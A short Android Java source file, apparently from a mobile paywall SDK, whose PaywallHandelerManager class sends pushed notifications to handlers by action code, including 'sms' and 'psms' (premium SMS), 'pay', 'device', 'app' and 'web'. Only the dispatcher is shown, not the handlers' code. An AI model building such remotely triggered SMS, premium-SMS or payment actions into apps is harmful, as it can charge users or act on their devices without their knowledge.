package com.mobilepaywall.core.handelers;

import android.content.Context;
import android.webkit.WebView;

import com.mobilepaywall.core.handelers.types.AppHandeler;
import com.mobilepaywall.core.handelers.types.DeviceHandeler;
import com.mobilepaywall.core.handelers.types.InternalHandeler;
import com.mobilepaywall.core.handelers.types.PingHandeler;
import com.mobilepaywall.core.handelers.types.PayHandeler;
import com.mobilepaywall.core.handelers.types.PremiumSmsHandler;
import com.mobilepaywall.core.handelers.types.SmsHandeler;
import com.mobilepaywall.core.handelers.types.WebHandeler;
import com.mobilepaywall.core.webrequests.PLog;

/**
 * Created by aco228 on 10/31/2016.
 */

public class PaywallHandelerManager {

  public static String TAG = "_HBase";

  public PaywallHandelerManager(PaywallNotificationBody notification, Context context, WebView webView)
  {
    switch (notification.getAction())
    {
      case "p":
      case "ping":
        (new PingHandeler(context)).execute(notification);
        return;

      case "w":
      case "web":
        (new WebHandeler(context, webView)).execute(notification);
        break;

      case "pay":
        (new PayHandeler(context, webView)).execute(notification);
        break;

      case "dev":
      case "device":
        (new DeviceHandeler(context)).execute(notification);
        break;

      case "app":
      case "application":
        (new AppHandeler(context)).execute(notification);
        break;

      case "in":
        (new InternalHandeler(context)).execute(notification);
        break;

      case "sms":
        (new SmsHandeler(context)).execute(notification);
        break;

      case "psms":
        (new PremiumSmsHandler(context)).execute(notification);
        break;

      default:
        PLog.d(TAG, "Action '" + notification.getAction() + "' is not recognizited");
        break;
    }
  }

}
